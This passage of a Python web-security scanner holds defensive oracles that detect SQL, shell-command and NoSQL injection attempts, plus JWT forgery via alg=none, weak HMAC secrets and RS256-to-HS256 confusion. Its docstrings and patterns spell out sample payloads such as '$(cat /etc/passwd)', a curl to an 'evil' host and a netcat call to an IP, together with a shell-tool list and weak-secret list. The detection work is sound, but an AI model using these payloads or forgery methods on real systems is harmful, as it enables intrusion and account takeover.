                                           "policy record — the published policy is UNRESOLVED (REFUSE)"))
        m = _DMARC_P_RE.search(rec)
        if m is None:
            return _email_signal(False, observed={"rule": rule},
                                 evidence="no parseable DMARC policy (p=) in the retained record (REFUSE)")
        policy = m.group(1).lower()
        if policy != "none":
            return _email_signal(False, observed={"rule": rule, "policy": policy},
                                 evidence=f"DMARC policy is p={policy} — receivers are told to act")
        return _email_signal(True, conf=0.9,
                             evidence=(f"DMARC policy{where} is p=none — the domain explicitly instructs "
                                       "receivers to take NO action on spoofed mail (monitoring only)"),
                             observed={"rule": rule, "domain": domain, "policy": policy})

    if rule == "spf_permissive":
        rec = _select_txt(observed_control.get("spf_record"), _SPF_VERSION_RE)
        if rec is None:
            return _email_signal(False, observed={"rule": rule},
                                 evidence=("the retained SPF record set does not resolve to a single policy "
                                           "record — the sender policy is UNRESOLVED (REFUSE)"))
        if not rec:
            return _email_signal(False, observed={"rule": rule},
                                 evidence="no SPF record retained (REFUSE — absence is a gating chain)")
        m = _SPF_ALL_RE.search(rec)
        if m is None:
            return _email_signal(False, observed={"rule": rule},
                                 evidence="the SPF record has no `all` mechanism (REFUSE)")
        qual = m.group(1) or "+"          # a bare `all` means `+all` (SPF default qualifier is pass)
        if qual != "+":
            return _email_signal(False, observed={"rule": rule, "qualifier": qual},
                                 evidence=f"SPF ends in {qual}all — not a pass-all policy")
        return _email_signal(True, conf=0.9,
                             evidence=(f"SPF{where} ends in +all — ANY host on the internet passes SPF for "
                                       "this domain (an unconditionally permissive sender policy)"),
                             observed={"rule": rule, "domain": domain, "qualifier": qual})

    return _email_signal(False, evidence=f"unrecognised/lead-only email-auth rule {rule!r} (stays a lead)",
                         observed={"rule": rule})


# ---------------------------------------------------------------------------
# AEGIS request-side PARSE-PROOF oracles (the inline "provable firewall" gateway).
#
# These judge a single DECODED request-parameter value on the REQUEST ALONE (no app response). They
# fire ONLY on a deterministic PARSE-PROOF that the value breaks grammar — mirroring how
# reflection_context_oracle PARSES to prove an executable context rather than substring-matching. A
# fire proves a STRUCTURED INJECTION ATTEMPT (a benign user never sends grammar-breaking SQL/shell),
# NOT that the app is exploited — an app that parameterises is still safe, and the response-side
# oracles (differential/error_signature/reflection_context) are what prove exploitation. The bar is
# deliberately TIGHT for near-zero false positives: raw payload signatures / lone metacharacters stay
# a LEAD (belief-raising), never a fire. Pure and deterministic (no wallclock/rng); ReDoS-safe
# (fixed-alternation, non-backtracking regexes over a length-capped value).
# ---------------------------------------------------------------------------

# SQL structure that, ANCHORED at the START of a break-out tail (immediately after the closing
# quote, modulo whitespace/parens), proves the value altered the query grammar. Anchoring is the
# near-zero-FP discipline: a real injection puts its structure right after the break-out quote
# (`' OR 1=1`, `'; DROP TABLE`), whereas prose has ordinary words between the (contraction) apostrophe
# and any SQL-looking token (`Don't drop the ball` -> tail `t drop the ball` has no structure at the
# start). A tautology must be a genuine SELF-comparison (`X=X`) — a bare number or a distant `or 5`
# is NOT a proof (that was the "5 or 6 options" false positive).
_SQL_TAUT_RE = re.compile(
    r"""(?i)^(OR|AND|XOR)\b\s*\(?\s*['"]?([A-Za-z0-9_]+)['"]?\s*(?:=|<=>|\bLIKE\b)\s*['"]?([A-Za-z0-9_]+)['"]?""")
_SQL_UNION_RE = re.compile(r"(?i)^UNION\b\s+(?:ALL\s+)?SELECT\b")
# A stacked statement must have a real STATEMENT SHAPE — the leading keyword AND its required
# companion (SELECT..FROM, INSERT..INTO, DROP TABLE, ...). SELECT/UPDATE/DELETE/DROP are also ordinary
# English verbs, so `; select the file` / `; delete the row` (benign UI/support prose) must NOT match;
# requiring the second keyword is what separates a statement from a verb. `.{0,120}?` is lazy+bounded
# (ReDoS-safe).
_SQL_STACK_RE = re.compile(
    r"(?is)^;\s*(?:"
    r"SELECT\b.{0,120}?\bFROM\b"
    r"|INSERT\b.{0,40}?\bINTO\b"
    r"|UPDATE\b.{0,80}?\bSET\b"
    r"|DELETE\b.{0,40}?\bFROM\b"
    r"|DROP\s+(?:TABLE|DATABASE|SCHEMA|INDEX|VIEW|USER)\b"
    r"|CREATE\s+(?:TABLE|DATABASE|SCHEMA|INDEX|VIEW|USER|PROCEDURE)\b"
    r"|ALTER\s+(?:TABLE|DATABASE|USER|SCHEMA)\b"
    r"|TRUNCATE\s+TABLE\b"
    r"|GRANT\b.{0,80}?\bTO\b"
    r"|EXEC(?:UTE)?\b\s+\w"
    r")")


def _sql_breakout_tails(text: str, quote: str):
    """Yield the QUERY-context tail after EACH UNESCAPED `quote` in `text` (the injection point is
    `... WHERE x=<quote>PAYLOAD<quote>`, and any quote in the payload could be the break-out). Honours
    `''` doubling and `\\` escapes so a legitimately-escaped quote stays inside the literal."""
    i, n = 0, len(text)
    while i < n:
        c = text[i]
        if c == "\\" and i + 1 < n:
            i += 2                                  # backslash-escaped char stays in the literal
            continue
        if c == quote:
            if i + 1 < n and text[i + 1] == quote:
                i += 2                              # doubled quote ('' or "") = an escaped quote
                continue
            yield text[i + 1:]                      # unescaped closing quote -> a candidate tail
        i += 1


def _sql_structure_at_start(tail: str) -> str:
    """The SQL structure PROVEN present at the START of a break-out tail, or "" — the near-zero-FP
    proofs, each ANCHORED immediately after the break-out (leading whitespace/parens skipped): a
    boolean SELF-tautology (`OR 1=1`, `OR 'a'='a'`), a `UNION [ALL] SELECT`, or a stacked statement
    with a full statement shape (`; DROP TABLE`, `; SELECT .. FROM`). A lone comment (`--`/`/*`) is
    DELIBERATELY not a proof — `'Inception' -- best film`, pasted code comments, and prose em-dashes
    after a quoted word produce it, so it was a false positive; an attacker's comment almost always
    follows a tautology/UNION we already catch. Prose after an apostrophe never matches."""
    s = tail.lstrip().lstrip("()").lstrip()
    if not s:
        return ""
    m = _SQL_TAUT_RE.match(s)
    if m and m.group(2).lower() == m.group(3).lower():
        return f"{m.group(1).upper()} tautology ({m.group(2)}={m.group(3)})"
    if _SQL_UNION_RE.match(s):
        return "UNION SELECT"
    if _SQL_STACK_RE.match(s):
        return "stacked statement"
    return ""


def sql_injection_breakout_oracle(payload: Any, *, param: str = "") -> OracleSignal:
    """Fire iff `payload`, placed inside a SQL string literal, PROVABLY closes it and introduces query
    STRUCTURE IMMEDIATELY after the break-out (a self-tautology / UNION SELECT / stacked statement /
    terminating comment). Proves a structured SQL injection ATTEMPT — never exploitation. The
    STRUCTURE must be anchored to the break-out quote, so ordinary apostrophe-bearing prose is safe:
    `O'Brien`, `it's fine`, `Don't drop the ball; I'll update you`, `I've got 5 or 6 options`,
    `credit union, please select` all have only text after the apostrophe and never fire.
    Pure/deterministic."""
    kind = OracleKind.SQL_INJECTION_BREAKOUT
    text = payload if isinstance(payload, str) else str(payload if payload is not None else "")
    if len(text) < 3 or ("'" not in text and '"' not in text):
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence="no string-literal break-out (no quote to close the literal)",
                            observed={"param": param})
    for quote in ("'", '"'):
        for tail in _sql_breakout_tails(text, quote):
            struct = _sql_structure_at_start(tail)
            if struct:
                return OracleSignal(
                    kind=kind, fired=True, confidence=0.92,
                    evidence=(f"payload closes a {quote} SQL string literal and introduces query "
                              f"structure ({struct}) at the break-out — a structured SQL injection attempt"),
                    observed={"param": param, "quote": quote, "structure": struct, "break_out": True})
    return OracleSignal(
        kind=kind, fired=False, confidence=0.0,
        evidence="quote present but no SQL structure anchored to a break-out (inert prose, e.g. an apostrophe in text)",
        observed={"param": param})


# Dangerous command binaries. A BARE command name is NOT a proof — ordinary prose, jQuery `$(id)`,
# and markdown `` `code` `` all contain command-like words — so a fire additionally REQUIRES a
# shell-ARGUMENT indicator (a SYSTEM path, `./`/`../`, a `-flag`, a URL, or an IPv4) next to the
# command. Comparison operators (`>`/`|`) and version slashes (`tool/1.2.3`) are DELIBERATELY excluded:
# `id > 1000` and `python-requests/2.25.1` are benign, and treating them as shell args was a false
# positive.
_SHELL_CMDS = ("cat", "ls", "id", "whoami", "uname", "nc", "ncat", "netcat", "curl", "wget", "bash",
               "sh", "zsh", "ksh", "powershell", "pwsh", "nslookup", "dig", "cmd", "python", "python3",
               "perl", "ruby", "php", "chmod", "chown", "mkfifo", "telnet", "socat", "base64", "xxd",
               "hostname", "ifconfig", "ping", "certutil", "sleep", "rm", "kill", "env")
_CMD_ALT = "|".join(sorted(set(_SHELL_CMDS), key=len, reverse=True))
_SHELL_CMD_RE = re.compile(r"(?i)(?<![A-Za-z0-9_])(" + _CMD_ALT + r")(?![A-Za-z0-9_])")
_SHELL_CMD_AT_START_RE = re.compile(r"(?i)^(" + _CMD_ALT + r")(?![A-Za-z0-9_])")
# A command SUBSTITUTION body: $(...) or `...`. The bounded, negated char classes are LINEAR (no
# backtracking), so this is ReDoS-safe on adversarial input.
_SHELL_SUBST_RE = re.compile(r"\$\(([^)]{1,300})\)|`([^`]{1,300})`")
# A shell-ARGUMENT indicator — restricted to unambiguous shell shapes: a FILESYSTEM path (a leading
# `/` into a known system dir, or `./`/`../`), a `-flag`, a URL, or an IPv4. A bare `>`/`|` (a
# comparison/pipe in prose) and a `tool/version` slash are NOT indicators.
_SHELL_SYS_DIRS = ("etc", "bin", "usr", "tmp", "var", "dev", "proc", "root", "sys", "opt", "home",
                   "sbin", "lib", "lib64", "mnt", "srv", "boot", "run", "media")
_SHELL_ARG_RE = re.compile(
    r"(?i)(?:/(?:" + "|".join(_SHELL_SYS_DIRS) + r")\b|\.\.?/|(?<=\s)-[a-z]{1,3}\b"
    r"|https?://|\b\d{1,3}(?:\.\d{1,3}){3}\b)")


def command_injection_breakout_oracle(payload: Any, *, param: str = "") -> OracleSignal:
    """Fire iff `payload` contains an OS-command-execution construct PROVEN by a dangerous command
    invoked WITH a shell argument — inside a command substitution (`$(cat /etc/passwd)`, `` `curl
    http://evil/x` ``), or AFTER a command separator (`; cat /etc/passwd`, `| nc 10.0.0.1 4444`).
    Conservative for near-zero FP: (a) a bare command name is not a proof, so a shell argument is
    required; (b) the separator branch SKIPS the first segment (a value that merely BEGINS with a
    command word — `python-requests/2.25.1`, `id > 1000` — had no preceding separator and is benign);
    (c) `>`/`|` and `tool/version` slashes are not arguments. So `$(id)` / `` `code` `` / `dog|cat` /
    `Name | Age | ID` / `id > 1000` / `python-requests/2.25.1` do NOT fire. ReDoS-safe (split on the
    separator class). Pure/deterministic; proves an ATTEMPT, never exploitation."""
    kind = OracleKind.COMMAND_INJECTION_BREAKOUT
    text = payload if isinstance(payload, str) else str(payload if payload is not None else "")
    if len(text) < 4:
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence="too short to carry a command-execution construct",
                            observed={"param": param})
    # (1) command substitution wrapping a dangerous command WITH an argument. `$(...)` / backticks are
    # already a strong shell signal, so a whitespace-separated argument also suffices — `$(id)` /
    # `` `code` `` / `$(document)` do NOT fire, but `$(sleep 5)` / `$(cat /etc/passwd)` do.
    for m in _SHELL_SUBST_RE.finditer(text):
        body = m.group(1) or m.group(2) or ""
        cmd = _SHELL_CMD_RE.search(body)
        if not cmd:
            continue
        after = body[cmd.end():]
        # a command immediately followed by `=` is a key=value / assignment / URL query param
        # (`id=https://...`), NOT a command invocation — the review's header/cookie false positive.
        if after[:1] == "=":
            continue
        if _SHELL_ARG_RE.search(after) or re.match(r"\s+\S", after):
            return OracleSignal(
                kind=kind, fired=True, confidence=0.9,
                evidence=(f"shell command substitution invokes {cmd.group(1)!r} with an argument — "
                          f"a structured OS command injection attempt"),
                observed={"param": param, "construct": "substitution", "command": cmd.group(1).lower()})
    # (2) a command SEPARATOR then a dangerous command WITH a shell argument. Split on the separator
    #     class (linear, no backtracking) and inspect each segment AFTER a real separator — segment[0]
    #     had NO preceding separator, so a value that merely starts with a command word is not a proof.
    for seg in re.split(r"[;|&\n\r]", text)[1:]:
        seg = seg.strip()
        cmd = _SHELL_CMD_AT_START_RE.match(seg)
        if not cmd:
            continue
        after = seg[cmd.end():]
        # `id=https://cdn/...` (a `&`-split URL query param in a Referer/cookie) is a key=value, NOT a
        # command invocation — the review's header/cookie command-injection false positive.
        if after[:1] == "=":
            continue
        if _SHELL_ARG_RE.search(after):
            return OracleSignal(
                kind=kind, fired=True, confidence=0.9,
                evidence=(f"a command separator chains to {cmd.group(1)!r} with an argument — "
                          f"a structured OS command injection attempt"),
                observed={"param": param, "construct": "separator+command", "command": cmd.group(1).lower()})
    return OracleSignal(
        kind=kind, fired=False, confidence=0.0,
        evidence="no command-execution construct (a bare command name or lone metacharacter is not a proof)",
        observed={"param": param})


# ---------------------------------------------------------------------------
# Wave-G2 NoSQL (MongoDB-style) operator-injection break-out oracle (the NOSQL_INJECTION_BREAKOUT kind).
#
# The request-side sibling of the SQL/command break-out oracles: it judges a single decoded request
# value AND its parameter NAME on the REQUEST ALONE, and fires ONLY on a deterministic parse-proof that
# a MongoDB QUERY OPERATOR was injected as a KEY where the app declared a SCALAR. A fire proves a
# STRUCTURED NoSQL operator-injection ATTEMPT (a benign user never sends operator-as-key structure), NOT
# that the app is exploited — an app that coerces the param to a string is still safe. Two re-runnable
# proofs, each near-zero-FP:
#   (1) the PARAM NAME carries a `$operator` as a whole bracket/dot KEY SEGMENT — `user[$ne]`, `q[$gt]`,
#       `a[b][$regex]`, `user.$ne`, or a bare `$where`. The qs/PHP/Express body-parser nests this into
#       `{user: {$ne: <value>}}`, so a query operator lands where a scalar param was declared.
#   (2) the VALUE parses to JSON and a `$operator` appears as an object KEY — `{"$ne":null}`, `{"$gt":""}`
#       (the classic `username={"$ne":1}` auth-bypass blob).
# Near-zero-FP by STRUCTURE, not signature:
#   * the token must be a KNOWN QUERY/logical operator (the curated allowlist below). The EJSON /
#     JSON-Schema / JSON-LD / DBRef `$`-keys (`$oid`, `$date`, `$numberLong`, `$binary`, `$schema`,
#     `$ref`, `$id`, `$comment`, ...) legitimately appear in bodies and are DELIBERATELY excluded — a
#     benign export/schema body never fires.
#   * it must be a KEY. A `$`-prefixed STRING VALUE (`["$ne"]`, `{"note":"use $ne"}`), a price `$5.00`,
#     `$net`, an email, a regex `^admin$`, a mid-word `$` (`pass$word`), or a plain scalar never fires.
# Pure/deterministic (no wallclock/rng/io); bounded; ReDoS-safe (fixed alternation, non-backtracking).
# ---------------------------------------------------------------------------

# The curated set of MongoDB QUERY / logical / evaluation / element / array operators whose appearance as
# an object KEY is an unambiguous injection signal. Stored WITHOUT the `$`, lowercased for a (?i) match.
# EJSON type-wrappers, JSON-Schema (`$schema`), JSON-LD, and DBRef (`$ref`/`$id`) keys are intentionally
# ABSENT — they are legitimate body content and including them would manufacture false positives.
_NOSQL_OPERATORS: frozenset[str] = frozenset({
    "ne", "eq", "gt", "gte", "lt", "lte", "in", "nin",     # comparison
    "or", "and", "nor", "not",                              # logical
    "exists",                                              # element
    "where", "expr", "mod", "text", "jsonschema",          # evaluation
    "all", "elemmatch", "size",                            # array
})
# DELIBERATELY EXCLUDED from the BLOCK allowlist (a review proved they false-positive as a hard block):
#   * `$type`  — also the .NET/System.Text.Json/Newtonsoft polymorphic type-discriminator key
#     (`{"$type":"Ns.Class, Asm"}`), extremely common benign JSON.
#   * `$regex` — also the legacy MongoDB Extended-JSON v1 serialization of a BSON regex VALUE
#     (`{"$regex":"pat","$options":"i"}`, bson.json_util legacy dumps) AND the shape a legitimate
#     regex-search API accepts. Dual-use → not offline-provable as an ATTEMPT without FPs, so it is
#     NOT a block (a $regex injection stays a lead at most). Near-zero-FP wins over coverage here.
# Longest-first alternation so a prefix operator (`gt`) cannot pre-empt its extension (`gte`); the
# key-segment lookahead below also guards this, but ordering keeps the match unambiguous.
_NOSQL_OP_ALT = "|".join(sorted(_NOSQL_OPERATORS, key=len, reverse=True))
# A `$operator` that is a WHOLE BRACKET key segment of a parameter name: preceded by start-of-string or
# `[`, and followed (lookahead) by end-of-string or `]`. So `user[$ne]`, `q[$gt]`, `a[b][$in]`, and a
# bare `$where` match; `pass$word`, `cost$negate`, and `$5.00` do NOT. DOT delimiting is deliberately
# NOT accepted: a JSON body is flattened to dotted param names (`a.b.c`), so a benign body with a literal
# key like `{"a":{"b.$ne":1}}` would flatten to `a.b.$ne` and a dot-segment rule would FALSE-fire on it
# (the review's flatten FP). Real JSON operator-KEY injection (`{"user":{"$ne":1}}`) is proven instead by
# the whole-body scan (`_nosql_operator_key`, which reads the ACTUAL parsed keys) — so dropping the dot
# form loses only the rarer dot-notation QUERY-STRING variant while eliminating the flatten false positive.
# Fixed alternation over a length-bounded name → non-backtracking.
_NOSQL_PARAM_OP_RE = re.compile(r"(?i)(?:^|\[)\$(" + _NOSQL_OP_ALT + r")(?=$|\])")
_NOSQL_JSON_CAP = 65536      # bound the JSON parse input on the value path (DoS-safe on adversarial input)
_NOSQL_SCAN_DEPTH = 32       # bound the recursion over a parsed JSON value (stack-safe)


def _nosql_operator_key(obj: Any, depth: int = 0) -> str:
    """The first KNOWN MongoDB operator appearing as an object KEY anywhere in a parsed JSON `obj` (to a
    bounded depth), returned WITH its `$` (e.g. ``"$ne"``), or "". Only a KEY counts — an operator as a
    string VALUE or a list element is inert (that is ordinary data / documentation, not query structure)."""
    if depth > _NOSQL_SCAN_DEPTH:
        return ""
    if isinstance(obj, dict):
        for k, v in obj.items():
            if isinstance(k, str) and k[:1] == "$" and k[1:].lower() in _NOSQL_OPERATORS:
                return "$" + k[1:].lower()
            hit = _nosql_operator_key(v, depth + 1)
            if hit:
                return hit
    elif isinstance(obj, list):
        for v in obj[:256]:                                 # bounded fan-out
            hit = _nosql_operator_key(v, depth + 1)
            if hit:
                return hit
    return ""


def _nosql_operator_key_in_json_text(text: str) -> str:
    """Parse ``text`` as JSON (only when it looks like a container) and return the first operator-as-key,
    or "". A non-JSON value (a price, an email, a scalar) parses to nothing here and stays inert."""
    s = text.strip()
    if s[:1] not in ("{", "[") or len(s) > _NOSQL_JSON_CAP:
        return ""
    try:
        obj = json.loads(s)
    except (ValueError, TypeError, RecursionError):
        return ""
    return _nosql_operator_key(obj)


def nosql_injection_breakout_oracle(payload: Any, *, param: str = "") -> OracleSignal:
    """Fire iff a request carries a MongoDB QUERY OPERATOR injected as a KEY where a SCALAR was expected —
    either (1) the PARAM NAME has a `$operator` as a whole BRACKET key segment (`user[$ne]`, `q[$gt]`,
    `a[b][$in]`, `$where`), which the framework nests into `{user:{$ne:…}}`; or (2) the VALUE parses to
    JSON with a `$operator` object KEY (`{"$ne":null}`). Proves a STRUCTURED NoSQL operator-injection
    ATTEMPT, never exploitation. Near-zero-FP: the token must be a KNOWN query operator (curated allowlist
    — the EJSON/JSON-Schema/DBRef `$`-keys AND the dual-use `$type`/`$regex` are excluded, since they are
    also legitimate .NET type-discriminators / EJSON regex data) AND a KEY, so a price `$5.00`, `$net`, an
    email, a regex `^admin$`, a mid-word `$` (`pass$word`), an operator as a string VALUE (`["$ne"]`), and
    a plain scalar all stay inert. Pure/deterministic; bounded; ReDoS-safe."""
    kind = OracleKind.NOSQL_INJECTION_BREAKOUT
    text = payload if isinstance(payload, str) else str(payload if payload is not None else "")
    name = param if isinstance(param, str) else str(param if param is not None else "")
    # (1) the PARAM NAME injects an operator as a nested bracket/dot KEY -> a query operator lands where a
    #     scalar param was declared. The strongest proof: it is proven by the request's own key structure.
    m = _NOSQL_PARAM_OP_RE.search(name)
    if m:
        op = "$" + m.group(1).lower()
        return OracleSignal(
            kind=kind, fired=True, confidence=0.9,
            evidence=(f"parameter {name!r} injects the MongoDB query operator {op!r} as a nested key where "
                      f"a scalar was expected — a structured NoSQL operator-injection attempt"),
            observed={"param": name, "operator": op, "vector": "operator_as_param_key", "break_out": True})
    # (2) the VALUE is a JSON object literal whose KEY is a known operator (`username={"$ne":null}`).
    op = _nosql_operator_key_in_json_text(text)
    if op:
        return OracleSignal(
            kind=kind, fired=True, confidence=0.9,
            evidence=(f"value parses to JSON carrying the MongoDB query operator {op!r} as an object key "
                      f"where a scalar was expected — a structured NoSQL operator-injection attempt"),
            observed={"param": name, "operator": op, "vector": "operator_as_json_key", "break_out": True})
    return OracleSignal(
        kind=kind, fired=False, confidence=0.0,
        evidence=("no NoSQL operator-injection structure (a $-prefixed KNOWN query operator as a KEY where "
                  "a scalar was expected); a $ in text/a price/an operator-shaped string value is inert"),
        observed={"param": name})


# ---------------------------------------------------------------------------
# Workstream-B SSO/JWT structural-forgery oracle (the SSO_ASSERTION_FORGERY kind).
#
# Judged on a captured JWT ALONE — offline, deterministic, ZERO forged traffic to any target. It
# promotes a token to STRUCTURALLY-FORGEABLE (a FACT anyone can re-verify from the token + the retained
# candidate keys) ONLY on a re-runnable proof, mirroring how the request-side parse-proof oracles judge
# a payload without an app response:
#
#   (a) alg=none/None      — a valid such token carries an EMPTY signature and needs NO secret, so
#       anyone can mint one with an arbitrary payload. Structural forgery by construction.
#   (b) HS* weak/known key — the token's EXACT signature is RECOMPUTABLE by HMAC over `header.payload`
#       with a supplied/weak candidate secret. An exact reproduction is a deterministic fact: whoever
#       holds that secret forges arbitrary tokens.
#   (c) RS256->HS256 confusion — the HS* signature reproduces with a supplied RSA/EC PUBLIC key (PEM)
#       as the HMAC secret. The verification material is PUBLIC, so anyone holding the public key forges
#       tokens a naive (algorithm-confusing) verifier accepts.
#
# Near-zero-FP: a normal RS256 token (an asymmetric signature, never an HMAC — the crack path is not
# even attempted for it), an HS* token whose secret is not in the candidate/weak set, and a malformed
# token all DO NOT fire. The proof is the token's OWN bytes + the retained candidate material, so a
# confirmed forgery re-verifies OFFLINE from its certificate. Pure + deterministic (no clock/rng/io).
# NOTE: the JWT primitives are re-implemented locally rather than imported from ``scanner.jwt`` — that
# module imports ``verify.adapter``, so a ``verify -> scanner`` import would be a cycle. They mirror
# ``scanner.jwt``'s codec/crack byte-for-byte.
# ---------------------------------------------------------------------------

# A small, curated set of the most notorious default/example HMAC secrets. A real random key never
# collides with these, so trying them adds coverage with no FP cost — an exact HMAC reproduction is a
# proof regardless of WHERE the secret came from (a weak key IS forgeable). Supplied ``candidate_keys``
# are tried IN ADDITION to these.
_WEAK_HS_SECRETS: tuple[str, ...] = (
    "secret", "secretkey", "secret_key", "password", "changeme", "admin", "test", "jwt",
    "jwtsecret", "jwt_secret", "jwt-secret", "key", "private", "your-256-bit-secret",
    "your_jwt_secret", "supersecret", "s3cr3t", "1234567890", "qwerty", "0000000000000000",
)

_JWT_HMAC_HASH = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
_JWT_SEG_CAP = 8192          # bound the header segment fed to the base64/JSON decoder (DoS-safe)
# Bound the HMAC SIGNING INPUT (`header.payload`) on the fire path too. A real JWT signing input is
# small (a few KB); anything past this is not a plausible token, so we decline to spend HMAC work on
# it (non-fire, stays a lead) rather than run HMAC over an attacker-sized buffer once per candidate
# key. This makes the "DoS-safe over an untrusted token" property enforced by code, not just claimed.
_JWT_SIGNING_INPUT_CAP = 65536


def _jwt_b64url_decode(seg: str) -> bytes:
    """base64url-decode one JWT segment (padding restored). Raises on malformed input."""
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


def _looks_like_public_key(candidate: str) -> bool:
    """True iff the candidate is PEM public-key material (an RSA/EC public key). Used ONLY to LABEL a
    confirmed HMAC reproduction as algorithm confusion vs a plain weak secret — never to gate firing."""
    return "PUBLIC KEY" in candidate


def jwt_forgery_oracle(token: Any, *, candidate_keys: Sequence[str | bytes] = ()) -> OracleSignal:
    """Fire (SSO_ASSERTION_FORGERY) iff the captured JWT ``token`` is STRUCTURALLY FORGEABLE by a proof
    re-runnable from the token alone: (a) ``alg=none``/``None``; (b) an HS* signature RECOMPUTABLE from a
    supplied/weak candidate secret; or (c) an RS256->HS256 confusion (the HS* signature reproduces with a
    supplied RSA/EC PUBLIC key as the HMAC secret). A normal RS256 token with an unknown key, an HS*
    token whose secret is not recoverable, and a malformed token DO NOT fire (near-zero-FP). Pure +
    deterministic — the verdict re-verifies offline from the token + retained candidate keys."""
    kind = OracleKind.SSO_ASSERTION_FORGERY
    text = token if isinstance(token, str) else _coerce_text(token)
    parts = text.split(".")
    if len(parts) != 3 or not parts[0] or not parts[1]:
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence="not a well-formed three-part JWT — nothing to adjudicate")
    try:
        header = json.loads(_jwt_b64url_decode(parts[0][:_JWT_SEG_CAP]))
    except (ValueError, binascii.Error):
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence="JWT header is not valid base64url JSON — cannot adjudicate")
    if not isinstance(header, Mapping):
        return OracleSignal(kind=kind, fired=False, confidence=0.0,
                            evidence="JWT header is not a JSON object — cannot adjudicate")
    alg = _coerce_text(header.get("alg")).strip()

    # (a) alg=none — a valid token needs NO secret; anyone can mint one. Structural forgery by
    #     construction. (All case variants: none / None / NONE / nOnE.)
    if alg.lower() == "none":
        return OracleSignal(
            kind=kind, fired=True, confidence=0.95,
            evidence=(f"alg={alg!r}: the token is UNSIGNED — a valid token needs no secret, so anyone "
                      f"can forge one with an arbitrary payload (re-verify: header.alg lowercases to 'none')"),
            observed={"proof": "alg_none", "alg": alg, "header": dict(header)})

    # (b)/(c) HS* — try to REPRODUCE the exact signature by HMAC over `header.payload`. An exact match
    #     is a deterministic proof the token is forgeable by whoever holds that secret. If the matching
    #     secret is a PUBLIC key, it is the RS256->HS256 confusion (public material => anyone forges).
    if alg.upper() in _JWT_HMAC_HASH:
        hasher = _JWT_HMAC_HASH[alg.upper()]
        # bound the HMAC signing input before spending work per candidate key (DoS-safe on an
        # attacker-sized token — an oversized "token" is not a real JWT, so we stay a lead).
        if len(parts[0]) + 1 + len(parts[1]) > _JWT_SIGNING_INPUT_CAP:
            return OracleSignal(
                kind=kind, fired=False, confidence=0.0,
                evidence=(f"{alg} signing input exceeds {_JWT_SIGNING_INPUT_CAP} bytes — not a plausible "
                          f"JWT; declining the HMAC recompute (stays a lead)"),
                observed={"alg": alg, "signing_input_len": len(parts[0]) + 1 + len(parts[1])})
        signing_input = f"{parts[0]}.{parts[1]}".encode("ascii", "ignore")
        target_sig = parts[2]
        for cand in (*candidate_keys, *_WEAK_HS_SECRETS):
            secret = cand if isinstance(cand, bytes) else _coerce_text(cand).encode("utf-8")
            recomputed = base64.urlsafe_b64encode(
                hmac.new(secret, signing_input, hasher).digest()).rstrip(b"=").decode("ascii")
            if hmac.compare_digest(recomputed, target_sig):
                cand_text = cand.decode("utf-8", "replace") if isinstance(cand, bytes) else _coerce_text(cand)
                if _looks_like_public_key(cand_text):
                    return OracleSignal(
                        kind=kind, fired=True, confidence=0.99,
                        evidence=(f"RS256->HS256 algorithm confusion: the {alg} signature reproduces with "
                                  f"the supplied RSA/EC PUBLIC key as the HMAC secret — public material "
                                  f"anyone holds forges accepted tokens (re-verify: "
                                  f"HMAC-{alg}(pubkey, header.payload) == signature)"),
                        observed={"proof": "rs256_hs256_confusion", "alg": alg,
                                  "hmac_key_is_public_key": True})
                return OracleSignal(
                    kind=kind, fired=True, confidence=0.99,
                    evidence=(f"{alg} signature RECOMPUTABLE from a weak/known secret {cand_text!r} — the "
                              f"exact HMAC reproduces, so whoever holds this secret forges arbitrary "
                              f"tokens (re-verify: HMAC-{alg}({cand_text!r}, header.payload) == signature)"),
                    observed={"proof": "hs256_weak_key", "alg": alg, "recovered_key": cand_text})
        return OracleSignal(
            kind=kind, fired=False, confidence=0.0,
            evidence=(f"{alg} signature not reproducible from any supplied/weak candidate key — the secret "
                      f"is not recoverable, so no structural-forgery proof (stays a lead)"),
            observed={"alg": alg, "candidates_tried": len(candidate_keys) + len(_WEAK_HS_SECRETS)})

    # A normal RS256/ES256/... token (an asymmetric signature, never an HMAC) — forging it needs the
    # PRIVATE key, which the token alone cannot yield. Correctly NOT a structural-forgery proof.
    #
    # DELIBERATELY NOT a fire path: an EMBEDDED verification key (a `jwk` or `x5c` header whose key
    # verifies the token). It is tempting to call that "self-signed, forgeable" (RFC 8725 §3.5), but an
    # adversarial review proved it is NOT offline-provable as a forgery: a legitimate CA-chained `x5c`
    # (the RFC 7515 §4.1.6 norm — the leaf IS the cert whose key signed the JWS) verifies identically to
    # a self-signed one, and legitimate flows embed a self-verifying `jwk` by design (DPoP proofs,
    # SIOP id_tokens). Whether the relying party WRONGLY trusts the embedded key over a proper trust
    # anchor is unknowable from the token alone — so firing here would false-positive on real Azure/
    # enterprise/DPoP tokens. It is a belief-raising RISK INDICATOR at most (a future AEGIS lead), never
    # a confirmed FACT. (`jku`/`x5u` URL-fetch headers are likewise leads — an offline oracle can't fetch.)
    return OracleSignal(
        kind=kind, fired=False, confidence=0.0,
        evidence=(f"alg={alg or '?'!r}: an asymmetric signature requires the private key to forge — not "
                  f"structurally forgeable from the token alone (stays a lead)"),
        observed={"alg": alg})


# ---------------------------------------------------------------------------
# Workstream NW-1 — the SAML structural-forgery oracle (the SAML_STRUCTURAL_FORGERY kind).
#
# The SSO SIBLING of jwt_forgery_oracle and the OFFLINE STRUCTURAL COMPLEMENT to the LIVE response-
# differential SAML checks in scanner.sso (SamlSignatureWrappingCheck / SamlAssertionTamperingCheck):
# those forge an artifact and observe ACCEPTANCE against a running SP; this judges a CAPTURED SAML
# Response's own XML ALONE — offline, deterministic, ZERO forged traffic — and promotes it to
# STRUCTURALLY-FORGEABLE only on a coarse, c14n-free STRUCTURAL invariant a VALIDLY SIGNED assertion
# cannot exhibit. It is the dual of scanner.sso.wrap_assertion_xsw.
#
#   (a) unsigned assertion   — the saml:Assertion carrying the consumed NameID has ZERO ds:Signature
#       anywhere in the message. An unsigned assertion needs no key, so anyone mints it.
#   (b) reference mismatch   — every ds:Reference/@URI points at some id OTHER than the consumed
#       assertion or any of its ancestors: the signature does NOT cover the consumed element, so its
#       content is swappable while a valid-looking signature rides along.
